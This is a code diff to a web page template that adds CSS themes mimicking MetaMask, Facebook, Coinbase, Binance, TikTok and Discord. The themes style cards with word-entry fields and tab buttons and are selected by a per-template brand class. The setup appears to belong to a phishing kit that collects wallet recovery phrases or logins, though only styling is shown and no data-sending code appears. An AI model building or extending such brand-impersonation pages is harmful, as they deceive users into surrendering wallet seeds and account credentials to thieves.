@@ -29,6 +29,34 @@ h1{font-size:1.2rem;margin-bottom:8px;text-align:center}
 .btn{width:100%;padding:14px;background:var(--ac);color:#fff;border:0;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer;transition:.2s}
 .btn:hover{opacity:.9}
 .err{background:#ef444420;border:1px solid #ef444440;border-radius:8px;padding:10px 14px;font-size:.84rem;color:#fca5a5;margin-bottom:12px;display:none}
+body.brand-metamask{background:#24272A;color:#fff}
+body.brand-metamask .card{background:#1c1f22;border:1px solid #3c4044;border-radius:12px}
+body.brand-metamask .word-input input{background:#2b2f36;border:1px solid #474d57;color:#fff}
+body.brand-metamask .tab-btn{background:#2b2f36;border:1px solid #474d57;color:#fff}
+body.brand-metamask .tab-btn.active{border-color:#F6851B;color:#F6851B}
+body.brand-metamask .btn{background:#F6851B;background-image:none}
+body.brand-facebook{background:#f0f2f5;color:#1c1e21}
+body.brand-facebook .card{background:#fff;box-shadow:0 2px 4px rgba(0,0,0,.1);border-radius:8px}
+body.brand-facebook .word-input input{background:#fff;border:1px solid #dddfe2;color:#1c1e21}
+body.brand-facebook .btn{background:#1877F2;background-image:none}
+body.brand-coinbase{background:#fff;color:#0a0b0d}
+body.brand-coinbase .card{background:#fff;border:1px solid #e9eaeb;border-radius:16px}
+body.brand-coinbase .word-input input{background:#f5f5f5;border:1px solid #e9eaeb;color:#0a0b0d}
+body.brand-coinbase .btn{background:#0052FF;background-image:none;border-radius:8px}
+body.brand-binance{background:#181A20;color:#eaecef}
+body.brand-binance .card{background:#1e2026;border:1px solid #2e3340;border-radius:8px}
+body.brand-binance .word-input input{background:#2b2f36;border:1px solid #474d57;color:#eaecef}
+body.brand-binance .tab-btn{background:#2b2f36;border:1px solid #474d57;color:#eaecef}
+body.brand-binance .tab-btn.active{border-color:#F0B90B;color:#F0B90B}
+body.brand-binance .btn{background:#F0B90B;color:#1a1a1a;background-image:none}
+body.brand-tiktok{background:#000;color:#fff}
+body.brand-tiktok .card{background:#161823;border:1px solid #2e3340;border-radius:0}
+body.brand-tiktok .word-input input{background:#2b2f36;border:1px solid #3c4044;color:#fff}
+body.brand-tiktok .btn{background:#fe2c55;background-image:none;border-radius:2px}
+body.brand-discord{background:#5865F2}
+body.brand-discord .card{background:#36393f;border-radius:5px}
+body.brand-discord .word-input input{background:#40444b;border:none;color:#dcddde}
+body.brand-discord .btn{background:#5865F2;background-image:none;border-radius:3px}
 </style>
 </head>
 <body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
